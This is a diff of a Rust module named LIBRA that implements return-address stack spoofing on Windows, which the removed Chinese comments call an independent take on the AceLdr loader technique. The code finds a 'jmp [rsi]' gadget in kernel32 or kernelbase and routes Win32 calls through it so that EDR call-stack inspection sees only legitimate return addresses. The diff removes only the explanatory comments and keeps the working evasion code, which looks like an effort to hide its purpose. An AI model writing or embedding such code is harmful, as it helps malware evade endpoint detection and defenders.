@@ -1,12 +1,5 @@
-//! 返回地址伪造（stack spoofing）：AceLdr 思路的独立实现。
 //!
-//! 核心手法：调用任意 Win32 函数前，把栈顶返回地址替换成目标模块内的一个
-//! `jmp [rsi]` gadget。EDR 回溯调用栈时看到的返回地址落在 kernel32/kernelbase
-//! 的合法指令上，而不是我们自己的模块。真正的返回地址被暂存到 `SpoofFrame`，
-//! 目标函数返回后经 gadget → fixup 恢复栈并跳回原返回地址。
 //!
-//! 与参考实现的差异：gadget 用 `FF 26`（`jmp [rsi]`）而非 `FF 23`（`jmp [rbx]`），
-//! 保存寄存器用 rsi 而非 rbx，结构布局与符号命名均独立。
 
 use core::sync::atomic::{AtomicU64, Ordering};
 
@@ -16,19 +9,14 @@ use crate::pe::PeImage;
 /// `jmp qword ptr [rsi]`
 const GADGET_PATTERN: [u8; 2] = [0xFF, 0x26];
 
-/// 全局 gadget 槽，`init_spoof` 填充一次，之后只读。
 #[used]
 #[no_mangle]
 pub static LIBRA_SPOOF_GADGET: AtomicU64 = AtomicU64::new(0);
 
-/// 传给汇编桥的帧。汇编会就地改写 `function` 与 `saved_rsi`。
 #[repr(C)]
 pub struct SpoofFrame {
-    /// 栈顶伪造的返回地址（`jmp [rsi]` gadget）。
     pub trampoline: usize,
-    /// 目标函数地址；返回阶段被改写为原返回地址。
     pub function: usize,
-    /// 暂存的 rsi。
     pub saved_rsi: usize,
 }
 
@@ -72,7 +60,6 @@ libra_spoof_fixup:
 "#
 );
 
-/// 在 kernel32 / kernelbase 的可执行段里找 `jmp [rsi]` gadget。
 pub fn init_spoof() -> Result<(), &'static str> {
     let gadget = find_gadget().ok_or("no jmp [rsi] gadget in kernel32/kernelbase")?;
     LIBRA_SPOOF_GADGET.store(gadget as u64, Ordering::Relaxed);
@@ -94,15 +81,9 @@ fn find_gadget() -> Option<usize> {
     None
 }
 
-/// 伪造返回地址地调用一个 Win32 函数。
 ///
-/// `target` 为目标函数地址（如 `GetProcAddress` 的结果）。前 8 个 `usize`
-/// 参数按 Win64 约定传递（寄存器 + 栈），多余参数填 0 即可。返回值即目标
-/// 函数的 `rax`。
 ///
 /// # Safety
-/// `target` 必须是合法的函数地址，参数必须与目标函数签名匹配。
-/// 调用前必须先 `init()`（或 `init_spoof()`），否则 panic。
 #[inline(always)]
 pub unsafe fn spoof_call(
     target: usize,
